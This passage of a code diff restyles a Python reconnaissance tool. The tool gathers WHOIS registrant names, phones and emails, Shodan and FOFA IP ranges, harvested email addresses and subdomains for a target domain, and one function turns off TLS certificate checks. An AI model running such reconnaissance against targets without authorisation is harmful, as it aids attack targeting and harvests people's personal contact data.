+                    personinfo["phone"] = phone
+                    personinfo["email"] = email
                     cnnic_result[names] = personinfo
-                    iterm +=1
-                cnnic_result['person_num'] = iterm - 1
-                self.result['cnnicinfo'] = cnnic_result
+                    iterm += 1
+                cnnic_result["person_num"] = iterm - 1
+                self.result["cnnicinfo"] = cnnic_result
                 return cnnic_result
             except Exception as e:
-                progress.total +=1
+                progress.total += 1
                 progress()
                 time.sleep(1)
-        self.result['cnnicinfo'] = None
+        self.result["cnnicinfo"] = None
         return None
 
     # whois information
@@ -7204,7 +7791,7 @@ class infoscan:
             email: email of register of domain
             registrar： registrar
             register: register
-            DNS: dns of 
+            DNS: dns of
             registe_time: time of domain registed
             overdur_time: time of domain over
         }
@@ -7212,9 +7799,17 @@ class infoscan:
         for i in range(3):
             try:
                 progress()
-                progress.current += 1   
-                domains = self.domain.replace("http://","").replace("https://","").replace("www.","")
-                who_search = "http://whois.chinaz.com/reverse?ddlSearchMode=4&host={}".format(domains)
+                progress.current += 1
+                domains = (
+                    self.domain.replace("http://", "")
+                    .replace("https://", "")
+                    .replace("www.", "")
+                )
+                who_search = (
+                    "http://whois.chinaz.com/reverse?ddlSearchMode=4&host={}".format(
+                        domains
+                    )
+                )
                 data_url = "http://whois.chinaz.com//whoishistory.aspx?host={}&guid={}"
                 User_Agent = [
                     "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
@@ -7234,22 +7829,28 @@ class infoscan:
                 ]
                 UserAgent = random.choice(User_Agent)
                 headers = {"User-Agent": UserAgent}
-                request = urllib2.Request(who_search,headers =  headers)
+                request = urllib2.Request(who_search, headers=headers)
                 result = urllib2.urlopen(request)
                 result = result.read()
-                data_guid = re.findall(r"data-guid='(.*?)'",result.decode('utf-8'))
+                data_guid = re.findall(r"data-guid='(.*?)'", result.decode("utf-8"))
                 info_list = []
                 for data in data_guid:
                     who_url = data_url.format(domains, data)
-                    requests = urllib2.Request(who_url, headers = headers)
+                    requests = urllib2.Request(who_url, headers=headers)
                     who_req = urllib2.urlopen(requests)
                     who_info = who_req.read()
                     who_info = who_info.decode("utf-8")
-                    blacks = re.findall(r"[<](.*?)[>]",who_info)
+                    blacks = re.findall(r"[<](.*?)[>]", who_info)
                     for i in blacks:
-                        who_info = who_info.replace(i,"")
-                    who_info = who_info.replace("<","").replace(">","").replace("--","").replace("\n","").replace("\r","")
-                    who_info = who_info[who_info.find("电话"):who_info.find("Tips")]
+                        who_info = who_info.replace(i, "")
+                    who_info = (
+                        who_info.replace("<", "")
+                        .replace(">", "")
+                        .replace("--", "")
+                        .replace("\n", "")
+                        .replace("\r", "")
+                    )
+                    who_info = who_info[who_info.find("电话") : who_info.find("Tips")]
                     info_list.append(who_info)
                 whoinfo_result = {}
                 iterm = 1
@@ -7257,20 +7858,37 @@ class infoscan:
                 for whois in info_list:
                     who = {}
                     name = "whoinfo" + str(iterm)
-                    who["phone"] = whois[whois.find("电话")+len("电话"):whois.find("邮箱")].strip(" ")
-                    who["email"] = whois[whois.find("邮箱")+len("邮箱"):whois.find("注册商")].strip(" ")
-                    who["registrar"] = whois[whois.find("注册商")+len("注册商"):whois.find("注册人")].strip(" ")
-                    who["register"] = whois[whois.find("注册人")+len("注册人"):whois.find("DNS")].strip(" ")
-                    who["DNS"] = whois[whois.find("DNS")+len("DNS"):whois.find("注册时间")].strip(" ")
-                    who["registe_time"] = whois[whois.find("注册时间")+len("注册时间"):whois.find("过期时间")].strip(" ")
-                    who["overdur_time"] = whois[whois.find("过期时间")+len("过期时间"):].strip(" ").strip("\n").strip("\r")
+                    who["phone"] = whois[
+                        whois.find("电话") + len("电话") : whois.find("邮箱")
+                    ].strip(" ")
+                    who["email"] = whois[
+                        whois.find("邮箱") + len("邮箱") : whois.find("注册商")
+                    ].strip(" ")
+                    who["registrar"] = whois[
+                        whois.find("注册商") + len("注册商") : whois.find("注册人")
+                    ].strip(" ")
+                    who["register"] = whois[
+                        whois.find("注册人") + len("注册人") : whois.find("DNS")
+                    ].strip(" ")
+                    who["DNS"] = whois[
+                        whois.find("DNS") + len("DNS") : whois.find("注册时间")
+                    ].strip(" ")
+                    who["registe_time"] = whois[
+                        whois.find("注册时间") + len("注册时间") : whois.find("过期时间")
+                    ].strip(" ")
+                    who["overdur_time"] = (
+                        whois[whois.find("过期时间") + len("过期时间") :]
+                        .strip(" ")
+                        .strip("\n")
+                        .strip("\r")
+                    )
                     whoinfo_result[name] = who
                     iterm += 1
                 whoinfo_result["infos_num"] = iterm - 1
                 self.result["whoisinfo"] = whoinfo_result
                 return whoinfo_result
             except Exception as e:
-                progress.total +=1
+                progress.total += 1
                 progress()
                 time.sleep(1)
         self.result["whoisinfo"] = None
@@ -7291,20 +7909,37 @@ class infoscan:
         for i in range(3):
             try:
                 progress()
-                progress.current += 1   
+                progress.current += 1
                 risk_info = subscanProcess(self.domain)
                 riskinfo_result = {}
-                raw_result = risk_info.passivetotal_get("/v2/whois?query={}&history=true".format(self.domain),json_using=False)
+                raw_result = risk_info.passivetotal_get(
+                    "/v2/whois?query={}&history=true".format(self.domain),
+                    json_using=False,
+                )
                 if "quota_exceeded" not in raw_result:
                     result = json.loads(raw_result)
-                    riskinfo_result["risk_nums"] = len(result["results"]) # number of risk results
+                    riskinfo_result["risk_nums"] = len(
+                        result["results"]
+                    )  # number of risk results
                     num = 0
                     for i in result["results"]:
                         name = "risk_info" + str(num)
                         info_every = {}
-                        info_every["name"] = i["registrant"]["name"] if i["registrant"].has_key("name") else None
-                        info_every["email"] = i["registrant"]["email"] if i["registrant"].has_key("email") else None
-                        info_every["telephone"] = i["registrant"]["telephone"] if i["registrant"].has_key("telephone") else None
+                        info_every["name"] = (
+                            i["registrant"]["name"]
+                            if i["registrant"].has_key("name")
+                            else None
+                        )
+                        info_every["email"] = (
+                            i["registrant"]["email"]
+                            if i["registrant"].has_key("email")
+                            else None
+                        )
+                        info_every["telephone"] = (
+                            i["registrant"]["telephone"]
+                            if i["registrant"].has_key("telephone")
+                            else None
+                        )
                         riskinfo_result[name] = info_every
                         num += 1
                     self.result["passivetotalinfo"] = riskinfo_result
@@ -7318,10 +7953,8 @@ class infoscan:
                 riskinfo_result = None
                 time.sleep(1)
 
-
         self.result["passivetotalinfo"] = riskinfo_result
         return riskinfo_result
-
 
     # get segementation of ip of C
     def getCseg(self):
@@ -7333,60 +7966,71 @@ class infoscan:
         """
         try:
             progress()
-            progress.current += 1  
+            progress.current += 1
             segmentC = {}
 
             # Separate two request
 
             for i in range(3):
                 try:
-                    fofoa_urlpath = 'domain ="'+self.domain +'"'
+                    fofoa_urlpath = 'domain ="' + self.domain + '"'
                     fofoa_urlpathurlpath = fofoa_urlpath.decode("gbk")
                     fofoa_urlpath = fofoa_urlpath.encode("utf-8")
-                    fofoa_urlpath = fofoa_urlpath.replace("'","\"")
-                    domains = fofoa_urlpath.encode("base64").replace("\r","").replace("\n","")
-                    email,token = Account().Fofakey()
+                    fofoa_urlpath = fofoa_urlpath.replace("'", '"')
+                    domains = (
+                        fofoa_urlpath.encode("base64")
+                        .replace("\r", "")
+                        .replace("\n", "")
+                    )
+                    email, token = Account().Fofakey()
                     fofa_size = 10000
-                    api_request = "https://fofa.info/api/v1/search/all?email=%s&size=%d&key=%s&qbase64=%s" % (email, fofa_size, token, domains)
+                    api_request = (
+                        "https://fofa.info/api/v1/search/all?email=%s&size=%d&key=%s&qbase64=%s"
+                        % (email, fofa_size, token, domains)
+                    )
                     foifa_json_result = urllib2.urlopen(api_request)
                     fofa_result = foifa_json_result.read()
                     fofa_result = json.loads(fofa_result)
                     ip = set()
                     for each_ip in fofa_result["results"]:
-                        if(":" in each_ip[1]):   #filete ipv6
+                        if ":" in each_ip[1]:  # filete ipv6
                             continue
                         ip.add(each_ip[1])
                     fofa_ip = ip
-                    fofaseg ,cloud = self.checkSection_C(fofa_ip)
+                    fofaseg, cloud = self.checkSection_C(fofa_ip)
                     segmentC["fofa"] = fofaseg
-                    segmentC["fofa_cloud"] = cloud # check is cloud from fofa
+                    segmentC["fofa_cloud"] = cloud  # check is cloud from fofa
                     # fofa result
                     break
                 except:
                     segmentC["fofa"] = None
-                    segmentC["fofa_cloud"] = None 
+                    segmentC["fofa_cloud"] = None
                     time.sleep(1)
 
             try:
-                shodan_api_request = "https://api.shodan.io/shodan/host/search?key=%s&query=hostname%3A%22"%self.shodan_key + self.domain + "%22"
+                shodan_api_request = (
+                    "https://api.shodan.io/shodan/host/search?key=%s&query=hostname%3A%22"
+                    % self.shodan_key
+                    + self.domain
+                    + "%22"
+                )
                 shodan_json_result = urllib2.urlopen(shodan_api_request)
                 shodan_result = shodan_json_result.read()
                 shodan_result = json.loads(shodan_result)
                 ip = set()
                 for each_ip in shodan_result["matches"]:
-                    if(":" in each_ip["ip_str"]): #filter IPV6
+                    if ":" in each_ip["ip_str"]:  # filter IPV6
                         continue
                     ip.add(each_ip["ip_str"])
                 shodan_ip = ip
-                shodanseg , cloud = self.checkSection_C(shodan_ip)
+                shodanseg, cloud = self.checkSection_C(shodan_ip)
                 segmentC["shodan"] = shodanseg
-                segmentC["shodan_cloud"] = cloud # checkis cloud from shodan
+                segmentC["shodan_cloud"] = cloud  # checkis cloud from shodan
                 # shodan result
             except:
                 segmentC["shodan"] = None
-                segmentC["shodan_cloud"] = None 
+                segmentC["shodan_cloud"] = None
                 time.sleep(1)
-
 
             self.result["getCseg"] = segmentC
 
@@ -7395,27 +8039,26 @@ class infoscan:
             self.result["getCseg"] = None
             return None
 
-
     # function of getCseg
-    def checkSection_C(self,ip,cloudSever = 0):
+    def checkSection_C(self, ip, cloudSever=0):
         cSectionList = set()
         cSectionDict = dict()
         cloud = None
         for i in ip:
             temp_list = i.split(".")
             tempa = temp_list[0] + "." + temp_list[1] + "." + temp_list[2] + ".0"
-            if(tempa not in cSectionList):
+            if tempa not in cSectionList:
                 cSectionList.add(tempa)
                 cSectionDict[tempa] = []
                 cSectionDict[tempa].append(i)
             else:
                 cSectionDict[tempa].append(i)
-        if(cloudSever==1):
+        if cloudSever == 1:
             for i in cSectionDict.keys():
                 temp_var = checkCloudSever(i)
-                if(temp_var != 0):
+                if temp_var != 0:
                     cloud = temp_var
-        return cSectionDict ,cloud
+        return cSectionDict, cloud
 
     # function of getCseg
     # check whether AliCloud or TecentCloud
@@ -7446,27 +8089,35 @@ class infoscan:
         # Microsoft cloud
         microsoft_vps = [(225122304, 225122559), (225157120, 225157375), (348263168, 348263423), (392440320, 392440575), (675807232, 675878399), (675878656, 675938303), (715063296, 715096063), (715096064, 715128831), (1074016256, 1074016511), (1093954080, 1093954175), (1093954208, 1093954270), (1093954272, 1093954287), (1093954304, 1093954319), (1094071392, 1094071423), (1094071808, 1094072319), (1094139904, 1094142975), (1094147936, 1094148095), (1176860416, 1176860543), (1176860608, 1176860639), (1176862304, 1176862335), (1176862368, 1176862399), (1176862528, 1176862703), (1728645120, 1728646143), (1758926592, 1758926847), (2346291712, 2346291967), (2346385408, 2346418175), (2346418176, 2346450943), (2637629808, 2637629823), (2637629952, 2637630079), (2637630464, 2637630479), (2637646128, 2637646129), (2637664256, 2637666783), (2637666800, 2637666815), (2637666816, 2637668351), (2637682688, 2637684735), (2822602752, 2822635519), (3586629632, 3586633727), (3586634944, 3586635007), (3586635776, 3586637823), (675878400, 675878655), (679349376, 679349503), (880957440, 880957695), (883897833, 883897833)]
 
-        vps_list = [("Netease_vps", wy_vps), ("Ali_vps", ali_vps), ("Tencent_vps", tencent_vps), ("Huawei_vps", huawei_vps), ("Qiniu_vps", qiniu_vps), ("Microsoft_vps", microsoft_vps)]
-        ch3 = lambda x:sum([256**j*int(i) for j,i in enumerate(x.split(".")[::-1])])
+        vps_list = [
+            ("Netease_vps", wy_vps),
+            ("Ali_vps", ali_vps),
+            ("Tencent_vps", tencent_vps),
+            ("Huawei_vps", huawei_vps),
+            ("Qiniu_vps", qiniu_vps),
+            ("Microsoft_vps", microsoft_vps),
+        ]
+        ch3 = lambda x: sum(
+            [256**j * int(i) for j, i in enumerate(x.split(".")[::-1])]
+        )
         int_ip = ch3(ip)
         for vps in vps_list:
             for segment in vps[1]:
-                #print(segment)
                 if int_ip >= segment[0] and int_ip <= segment[1]:
                     return vps[0]
         return 0
 
-
-    # function of search email 
+    # function of search email
     def Getemail(self):
         """
         <email>: email of search
         <time> : time of earch email
         example: {"aaa@example.com":"Aug 2012"}
-         """
+        """
         try:
             ssl._create_default_https_context = ssl._create_unverified_context
-        except: pass
+        except:
+            pass
         for i in range(3):
             try:
                 progress()
@@ -7479,14 +8130,18 @@ class infoscan:
                 r = ho.open(emailReq, timeout=10)
                 email_content = r.read().decode("utf-8")
                 tr = re.compile(r"<tr>[\S\s]*?</tr>")
-                part = re.compile(r"[\s\S]*?([\d\w\.-_]+@"+ self.domain +r")[\s\S]*?score\s-?\d+[\s\S]*?found\s([\s\S]*)\s-[\s\S]*")
+                part = re.compile(
+                    r"[\s\S]*?([\d\w\.-_]+@"
+                    + self.domain
+                    + r")[\s\S]*?score\s-?\d+[\s\S]*?found\s([\s\S]*)\s-[\s\S]*"
+                )
                 getemail = {}
                 for item in tr.findall(email_content):
                     getemail[part.match(item).group(1)] = part.match(item).group(2)
 
                 self.result["Getemail"] = getemail
                 return getemail
-               
+
             except Exception as e:
                 progress.total += 1
                 progress()
@@ -7495,7 +8150,6 @@ class infoscan:
 
         self.result["Getemail"] = getemail
         return getemail
-
 
     # domain area
     def Getsubdomain(self):
@@ -7521,40 +8175,38 @@ class infoscan:
 
         sub_result = duprm(pdns_results["subdomains"], cert_results, vts_results)
 
-
-
         sys.stdout.write("\r")
         sys.stdout.flush()
-
 
         sub_result_domain = []
 
         for subs in sub_result:
-            sub_result_domain.append(subs + "." +self.domain)
+            sub_result_domain.append(subs + "." + self.domain)
 
         self.result["subdomain"] = sub_result_domain
 
         return sub_result_domain
 
 
-
 class INFOHtml:
-
     def __init__(self):
         pass
 
     @staticmethod
     def SEGE(infofuc):
-        # get segement of C 
+        # get segement of C
         # from https://fofa.info and https://www.shodan.io/
         getCseg = infofuc.getCseg()
         getCseg_contents = ""
         if getCseg is None:
-            print(PASSAT("[*]") + " segement C  require failed" + " "*30)
+            print(PASSAT("[*]") + " segement C  require failed" + " " * 30)
             getCseg_contents += """<div class="alert alert-primary" style="margin-top: 20px" role="alert">ip segement required fail</div></div>"""
         else:
-            print(info("[+]") + " segement C require successfull" + " "*30)
-            getCseg_contents += """<div class="alert alert-primary" style="margin-top: 20px" role="alert">Result of %s segement C:</br>"""%(domain)
+            print(info("[+]") + " segement C require successfull" + " " * 30)
+            getCseg_contents += (
+                """<div class="alert alert-primary" style="margin-top: 20px" role="alert">Result of %s segement C:</br>"""
+                % (domain)
+            )
             if getCseg["shodan"] is not None:
                 shodan_seg = "shodan: "
                 for ips in getCseg["shodan"].keys():
@@ -7562,7 +8214,7 @@ class INFOHtml:
 
                 if getCseg["shodan_cloud"] is not None:
                     shodan_seg += "(Cloud detected: " + getCseg["shodan_cloud"] + ")"
-                shodan_seg += "</br>"   
+                shodan_seg += "</br>"
                 getCseg_contents += shodan_seg
             else:
                 getCseg_contents += "shodan: None</br>"
@@ -7572,7 +8224,7 @@ class INFOHtml:
                     fofa_seg += "[ " + ips + "-" + getCseg["fofa"][ips][0] + "] "
 
                 if getCseg["fofa_cloud"] is not None:
-                    fofa_seg +="(Cloud detected: " + getCseg["fofa_cloud"] + ")"
+                    fofa_seg += "(Cloud detected: " + getCseg["fofa_cloud"] + ")"
 
                 fofa_seg += "</br>"
                 getCseg_contents += fofa_seg
@@ -7580,7 +8232,6 @@ class INFOHtml:
                 getCseg_contents += "fofa: None</br>"
             getCseg_contents += "</div>"
         return getCseg_contents
-
 
     @staticmethod
     def DNS1(infofuc):
@@ -7590,12 +8241,12 @@ class INFOHtml:
         vtdns_contents = ""
         vt_dnsapi = "https://www.virustotal.com/vtapi/v2/domain/report"
         if vtdns_records is None:
-            print(PASSAT("[*]") + " vdns records require failed" + " "*30)
+            print(PASSAT("[*]") + " vdns records require failed" + " " * 30)
             vtdns_contents += infofuc.fhtmlencode(8, "vdns records", vt_dnsapi)
         else:
-            print(info("[+]") + " vdns records require successfull" + " "*30)
+            print(info("[+]") + " vdns records require successfull" + " " * 30)
             totals = vtdns_records["iterm"]
-            details = "<tbody style=\"word-break:break-all; word-wrap:break-all;\">"
+            details = '<tbody style="word-break:break-all; word-wrap:break-all;">'
             types = """<thead class="thead-default">
                 <tr>
                 <th>#</th>
@@ -7607,7 +8258,7 @@ class INFOHtml:
            </thead>
             """
             for iterm in range(totals):
-                name = "records" + str(iterm+1)
+                name = "records" + str(iterm + 1)
                 each_records = """<tr>
                    <th scope="row">%d</th>
                    <td>%s</td>
@@ -7615,15 +8266,23 @@ class INFOHtml:
                    <td>%s</td>
                    <td>%s</td>
                 </tr>
-                """%(iterm+1, vtdns_records[name]["priority"] if "priority" in vtdns_records[name].keys() else None ,vtdns_records[name]["type"],vtdns_records[name]["value"],vtdns_records[name]["ttl"])
-                details +=each_records
-            details +="</tbody>"
+                """ % (
+                    iterm + 1,
+                    vtdns_records[name]["priority"]
+                    if "priority" in vtdns_records[name].keys()
+                    else None,
+                    vtdns_records[name]["type"],
+                    vtdns_records[name]["value"],
+                    vtdns_records[name]["ttl"],
+                )
+                details += each_records
+            details += "</tbody>"
             others = ""
             if "other" in vtdns_records.keys():
                 for keys in vtdns_records["other"]:
                     others += keys + ": " + vtdns_records["other"][keys]
 
-            vtdns_contents +="""<div class="col-lg-8">
+            vtdns_contents += """<div class="col-lg-8">
                     <div class="card m-b-30">
                         <div class="card-body">
                         <h4>vdns records</h4>
@@ -7637,7 +8296,12 @@ class INFOHtml:
                     </div>
                 </div>
                 </div>
-            """%(totals,vt_dnsapi,types+details,others)
+            """ % (
+                totals,
+                vt_dnsapi,
+                types + details,
+                others,
+            )
 
         return vtdns_contents
 
@@ -7649,11 +8313,13 @@ class INFOHtml:
         vt_resolutions_contents = ""
         vt_resolutions_api = "https://www.virustotal.com/vtapi/v2/domain/report"
         if vt_resolutions is None:
-            print(PASSAT("[*]") + " vt resolutions require failed" + " "*30)
-            vt_resolutions_contents += infofuc.fhtmlencode(4, "vt resolutions history", vt_resolutions_api)
+            print(PASSAT("[*]") + " vt resolutions require failed" + " " * 30)
+            vt_resolutions_contents += infofuc.fhtmlencode(
+                4, "vt resolutions history", vt_resolutions_api
+            )
 
         else:
-            print(info("[+]") + " vt resolutions require successfull" + " "*30)
+            print(info("[+]") + " vt resolutions require successfull" + " " * 30)
             totals = vt_resolutions["iterm"]
             details = "<tbody>"
             types = """<thead class="thead-default">
@@ -7662,13 +8328,17 @@ class INFOHtml:
            </thead>
             """
             for iterm in range(totals):
-                name = "resolved" + str(iterm+1)
+                name = "resolved" + str(iterm + 1)
                 each_resolution = """<tr>
                    <th scope="row">%d</th>
                    <td>%s</td>
                    <td>%s</td>
                 </tr>
-                """%(iterm+1,vt_resolutions[name]["last_resolved"],vt_resolutions[name]["ip_address"])
+                """ % (
+                    iterm + 1,
+                    vt_resolutions[name]["last_resolved"],
+                    vt_resolutions[name]["ip_address"],
+                )
                 details += each_resolution
             details += "</tbody>"
             vt_resolutions_contents += """<div class="col-lg-4">
@@ -7683,7 +8353,11 @@ class INFOHtml:
                     </div>
                 </div>
             </div>
-            """%(totals, vt_resolutions_api, types + details )
+            """ % (
+                totals,
+                vt_resolutions_api,
+                types + details,
+            )
 
         return vt_resolutions_contents
 
@@ -7694,12 +8368,13 @@ class INFOHtml:
         whoisinfo_api = "http://whois.chinaz.com/"
         whoisinfo_content = ""
         if whoisinfo is None:
-            print(PASSAT("[*]") + " whois require failed" + " "*35)
-            whoisinfo_content += infofuc.fhtmlencode(12, "whois information", whoisinfo_api)
-
+            print(PASSAT("[*]") + " whois require failed" + " " * 35)
+            whoisinfo_content += infofuc.fhtmlencode(
+                12, "whois information", whoisinfo_api
+            )
 
         else:
-            print(info("[+]") + " whois  require successfull" + " "*40)
+            print(info("[+]") + " whois  require successfull" + " " * 40)
             totals = whoisinfo["infos_num"]
             details = ""
             types = """<thead class="thead-default">
@@ -7709,19 +8384,23 @@ class INFOHtml:
             """
             for iterm in range(totals):
                 name = "whoinfo" + str(iterm + 1)
-                infos = "<tbody style=\"word-break:break-all; word-wrap:break-all;\">"
-                for keys in whoisinfo[name].keys():   
+                infos = '<tbody style="word-break:break-all; word-wrap:break-all;">'
+                for keys in whoisinfo[name].keys():
                     infos += """
                     <tr>
                        <th scope="row">%d</th>
                        <td>%s</td>
                        <td>%s</td>
                     </tr>
-                    """%(iterm + 1, keys, whoisinfo[name][keys])
-                infos += "<tr style=\"height:50px\"></tr></tbody>"
-                details +=infos
+                    """ % (
+                        iterm + 1,
+                        keys,
+                        whoisinfo[name][keys],
+                    )
+                infos += '<tr style="height:50px"></tr></tbody>'
+                details += infos
 
-            whoisinfo_content +="""<div class="col-lg-12">
+            whoisinfo_content += """<div class="col-lg-12">
                     <div class="card m-b-30">
                         <div class="card-body">
                         <h4>whois information</h4>
@@ -7734,24 +8413,28 @@ class INFOHtml:
                     </div>
                 </div>
             </div>
-            """%(totals, whoisinfo_api, types + details)
+            """ % (
+                totals,
+                whoisinfo_api,
+                types + details,
+            )
 
         return whoisinfo_content
 
     @staticmethod
     def WHOIS2(infofuc):
-        # cnnic result 
+        # cnnic result
         # http://ipwhois.cnnic.net.cn/bns/query/Query/ipwhoisQuery.do
         cnnicinfo = infofuc.cnnicinfo()
         cnnic_api = "http://ipwhois.cnnic.net.cn/bns/query/Query/ipwhoisQuery.do"
         cnnicinfo_content = ""
         if cnnicinfo is None:
-            print(PASSAT("[*]") + " cnnic information require failed" + " "*30)
+            print(PASSAT("[*]") + " cnnic information require failed" + " " * 30)
             cnnicinfo_content += infofuc.fhtmlencode(6, "cnnic info", cnnic_api)
         else:
-            print(info("[+]") + " cnnic information  require successfull" + " "*30)
+            print(info("[+]") + " cnnic information  require successfull" + " " * 30)
             person_num = cnnicinfo["person_num"]
-            details = "<tbody style=\"word-break:break-all; word-wrap:break-all;\">"
+            details = '<tbody style="word-break:break-all; word-wrap:break-all;">'
             types = """<thead class="thead-default">
                 <tr><th>#</th><th>name</th><th>phone</th><th>email</th>
                 </tr></thead>
@@ -7765,7 +8448,12 @@ class INFOHtml:
                    <td>%s</td>
                    <td>%s</td>
                 </tr>
-                """%(iterm + 1,cnnicinfo[name]["name"],cnnicinfo[name]["phone"], cnnicinfo[name]["email"] )
+                """ % (
+                    iterm + 1,
+                    cnnicinfo[name]["name"],
+                    cnnicinfo[name]["phone"],
+                    cnnicinfo[name]["email"],
+                )
                 details += each_person
 
             details += "</tbody>"
@@ -7775,7 +8463,11 @@ class INFOHtml:
             <p class="mb-0">domain ipv4: %s</p>
             <p class="mb-0">address: %s</p>
             </div>
-            """%(cnnicinfo["desc_company"], cnnicinfo["ipv4"], cnnicinfo["address"])
+            """ % (
+                cnnicinfo["desc_company"],
+                cnnicinfo["ipv4"],
+                cnnicinfo["address"],
+            )
             cnnicinfo_content += """<div class="col-lg-6">
                     <div class="card m-b-30">
                         <div class="card-body">
@@ -7788,25 +8480,29 @@ class INFOHtml:
                     </div>
                 </div>
             </div>
-            """%(domaininfo,cnnic_api, types + details )
+            """ % (
+                domaininfo,
+                cnnic_api,
+                types + details,
+            )
 
         return cnnicinfo_content
 
     @staticmethod
     def WHOIS3(infofuc):
-        # email information search 
+        # email information search
         # https://www.email-format.com/
 
         email_info = infofuc.Getemail()
         email_content = ""
         email_api = "https://www.email-format.com/"
         if email_info is None:
-            print(PASSAT("[*]") + " email search require failed" + " "*30)
+            print(PASSAT("[*]") + " email search require failed" + " " * 30)
             email_content += infofuc.fhtmlencode(6, "email information", email_api)
 
         else:
-            print(info("[+]") + " email search require successfull" + " "*30)
-            details = "<tbody style=\"word-break:break-all; word-wrap:break-all;\">"
+            print(info("[+]") + " email search require successfull" + " " * 30)
+            details = '<tbody style="word-break:break-all; word-wrap:break-all;">'
             types = """<thead class="thead-default">
                 <tr><th>#</th><th>email</th><th>date</th>
             """
@@ -7817,11 +8513,15 @@ class INFOHtml:
                    <td>%s</td>
                    <td>%s</td>
                 </tr>
-                """%(iterm + 1,keys, email_info[keys])
+                """ % (
+                    iterm + 1,
+                    keys,
+                    email_info[keys],
+                )
                 details += each_email
                 iterm = iterm + 1
 
-            email_content +="""<div class="col-lg-6">
+            email_content += """<div class="col-lg-6">
                     <div class="card m-b-30">
                         <div class="card-body">
                         <h4>email information</h4>
@@ -7834,43 +8534,50 @@ class INFOHtml:
                     </div>
                 </div>
             </div>
-            """%(iterm, email_api, types + details)
+            """ % (
+                iterm,
+                email_api,
+                types + details,
+            )
 
         return email_content
 
     @staticmethod
     def WHOIS4(infofuc):
-        # riskiq infomarions 
+        # riskiq infomarions
         # https://api.passivetotal.org/v2/whois
 
         riskiq_info = infofuc.passivetotalinfo()
         riskiq_content = ""
         riskiq_api = "https://api.passivetotal.org/v2/whois"
         if riskiq_info is None:
-            print(PASSAT("[*]") + " riskiq require failed" + " "*30)
+            print(PASSAT("[*]") + " riskiq require failed" + " " * 30)
             riskiq_content += infofuc.fhtmlencode(6, "riskiq information", riskiq_api)
 
-
-
         else:
-            print(info("[+]") + " riskiq require successfull" + " "*30)
-            details = "<tbody style=\"word-break:break-all; word-wrap:break-all;\">"
+            print(info("[+]") + " riskiq require successfull" + " " * 30)
+            details = '<tbody style="word-break:break-all; word-wrap:break-all;">'
             types = """<thead class="thead-default">
                 <tr><th>#</th><th>telephone</th><th>name</th><th>email</th>
             """
             risknum = riskiq_info["risk_nums"]
             for iterm in range(risknum):
-                name = "risk_info"+str(iterm)
+                name = "risk_info" + str(iterm)
                 each_risk = """<tr>
                    <th scope="row">%d</th>
                    <td>%s</td>
                    <td>%s</td>
                    <td>%s</td>
                 </tr>
-                """%(iterm + 1,riskiq_info[name]["telephone"], riskiq_info[name]["name"],riskiq_info[name]["email"])
+                """ % (
+                    iterm + 1,
+                    riskiq_info[name]["telephone"],
+                    riskiq_info[name]["name"],
+                    riskiq_info[name]["email"],
+                )
                 details += each_risk
 
-            riskiq_content +="""<div class="col-lg-6">
+            riskiq_content += """<div class="col-lg-6">
                     <div class="card m-b-30">
                         <div class="card-body">
                         <h4>riskiq information</h4>
@@ -7883,7 +8590,11 @@ class INFOHtml:
                     </div>
                 </div>
             </div>
-            """%(iterm + 1, riskiq_api, types + details)
+            """ % (
+                iterm + 1,
+                riskiq_api,
+                types + details,
+            )
 
         return riskiq_content
 
@@ -7892,49 +8603,62 @@ class INFOHtml:
         # subdomain result from  subscan module
 
         sub_dict = infofuc.Getsubdomain()
-        print(info("[+]") + " subdomain require successfull" + " "*60)
+        print(info("[+]") + " subdomain require successfull" + " " * 60)
         subdomain_content = """<div data-spy="scroll" data-target="#navbar-example" data-offset="0"
          style="height:200px;overflow:auto; position: relative;" style="margin-top: 20px" role="alert">
                                 """
         for subs in sub_dict:
-            links = "<a href=\"%s\">%s</a>&nbsp&nbsp&nbsp"%(subs, subs)
-            subdomain_content += (links + " ")
+            links = '<a href="%s">%s</a>&nbsp&nbsp&nbsp' % (subs, subs)
+            subdomain_content += links + " "
 
-        if len(sub_dict)==0:
+        if len(sub_dict) == 0:
             subdomain_content += "<p>subdomain require is None</p>"
-        subdomain_content +="</div>"
+        subdomain_content += "</div>"
 
         return subdomain_content
-
-
 
 
 def infoprocess(filename, domain):
     global progress_num, progress
 
     banner = info("\nChoose the scan modules:") + "\n"
-    print("\nType \"help\" for more information.")
+    print('\nType "help" for more information.')
     segment_switch = "[*]SEGE\t\tget C of segement\n\n"
 
-    dns_choose = "[*]DNS\\" + attention("1") + "\t\tvdns records scan\n" + \
-    "[*]DNS\\" + attention("2") + "\t\tvt resolutions history\n\n" 
+    dns_choose = (
+        "[*]DNS\\"
+        + attention("1")
+        + "\t\tvdns records scan\n"
+        + "[*]DNS\\"
+        + attention("2")
+        + "\t\tvt resolutions history\n\n"
+    )
 
-    whois_choose = "[*]WHOIS\\" + attention("1") + "\t\twhois information\n" + \
-    "[*]WHOIS\\" + attention("2") + "\t\tcnnic information\n" + \
-    "[*]WHOIS\\" + attention("3") + "\t\temail information\n" + \
-    "[*]WHOIS\\" + attention("4") + "\t\triskiq information\n\n"
+    whois_choose = (
+        "[*]WHOIS\\"
+        + attention("1")
+        + "\t\twhois information\n"
+        + "[*]WHOIS\\"
+        + attention("2")
+        + "\t\tcnnic information\n"
+        + "[*]WHOIS\\"
+        + attention("3")
+        + "\t\temail information\n"
+        + "[*]WHOIS\\"
+        + attention("4")
+        + "\t\triskiq information\n\n"
+    )
 
     subscan_switch = "[*]SUBDOMAIN\t\tsubscan information\n"
 
     all_scan = "[*]ALLSCAN\t\tall scan\n"
 
-    banner +=(segment_switch + dns_choose + whois_choose + subscan_switch + all_scan)
-
+    banner += segment_switch + dns_choose + whois_choose + subscan_switch + all_scan
 
     modules = []
 
     # deal with input
-    # init number of scan 
+    # init number of scan
 
     while True:
         if PYVERSION < "3.0":
@@ -7942,7 +8666,8 @@ def infoprocess(filename, domain):
         else:
             choose = str(input(attention("infoscan") + ">"))
         choose = choose.strip().strip("\n").strip("\r")
-        if choose == "":continue
+        if choose == "":
+            continue
         if choose == "help":
             print(banner)
             print("Example: DNS\\1\\2 WHOIS\\2\\3")
@@ -7970,28 +8695,28 @@ def infoprocess(filename, domain):
             ch = ch.upper()
             if ch.startswith("SEGE"):
                 modules.append("SEGE")
-                progress_num +=1
+                progress_num += 1
 
             elif ch.startswith("DNS"):
                 dns_model = ch.split("\\")
-                for i in range(1,len(dns_model)):
+                for i in range(1, len(dns_model)):
                     if dns_model[i].isdigit():
